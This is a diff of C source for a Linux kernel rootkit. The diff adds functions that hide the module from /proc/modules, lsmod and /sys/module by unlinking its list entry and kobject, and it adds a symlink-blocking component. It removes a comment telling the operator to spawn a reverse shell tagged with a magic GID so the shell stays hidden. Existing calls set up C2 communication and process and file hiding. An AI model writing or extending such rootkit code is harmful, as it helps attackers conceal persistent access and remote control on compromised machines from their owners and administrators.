@@ -179,16 +179,52 @@ void blocking_exit(void)
 }
 
 /* Module self-hiding */
+
 /*
-static bool module_hidden;
+bool module_hidden;
 static struct list_head *saved_prev;
+//static struct kobject *saved_kobj_parent;
 
 void hide_module(void)
 {
+  if (module_hidden) {
+    pr_warn("[rootkit][WARNING] module already in hidden state\n");
+    return;
+  }
+
+  //hide from /proc/modules and lsmod
+  saved_prev = THIS_MODULE->list.prev;
+  list_del_rcu(&THIS_MODULE->list);
+
+  //hide from /sys/module/
+  saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
+  kobject_get(&THIS_MODULE->mkobj.kobj);
+  kobject_del(&THIS_MODULE->mkobj.kobj);
+
+  module_hidden = true;
+  pr_info("[rootkit] module hidden\n");
 }
+
 
 void show_module(void)
 {
+  //int ret;
+  if (!module_hidden) {
+    pr_warn("[rootkit][WARNING] module not hidden\n");
+  }
+
+  //restore to /proc/modules
+  list_add_rcu(&THIS_MODULE->list, saved_prev);
+
+  //restore to /sys/module/ (re-add kobject under saved parent)
+  ret = kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj_parent, "%s", THIS_MODULE->name);
+  if (ret) {
+    pr_err("[rootkit][ERROR] kobject_add failed: %d (sysfs entry not restored)\n", ret);
+  }
+  kobject_put(&THIS_MODULE->mkobj.kobj);
+
+  module_hidden = false;
+  pr_info("[rootkit] module restored\n");
 }
 */
 
@@ -198,10 +234,6 @@ static int __init rootkit_init(void)
 {
 	int ret;
   pr_info("[rootkit] initializing\n");
-	/* Once the hiding hooks are active, spawn your reverse shell (or
-	* whatever persistent operator process you use) and mark it with
-	* your operator identifier (e.g. the magic GID) so it is hidden
-	* and has bypass access from the moment it starts. */
 
   ret = c2_init();
   if (ret < 0) {
@@ -228,10 +260,17 @@ static int __init rootkit_init(void)
     goto errorpoint4;
   }
 
+  ret = slink_block_init();
+  if (ret < 0) {
+    goto errorpoint5;
+  }
+
   pr_info("[rootkit] All modules loaded");
-	return 0;
+  return 0;
 
   //goto based error unwinding
+errorpoint5:
+  blocking_exit();
 errorpoint4:
   proc_hide_exit();
 errorpoint3:
@@ -248,6 +287,8 @@ static void __exit rootkit_exit(void)
 {
   pr_info("[rootkit] cleaning up\n");
 	
+  //show_module();
+  slink_block_exit();
   blocking_exit();
   proc_hide_exit();
   file_hide_exit();
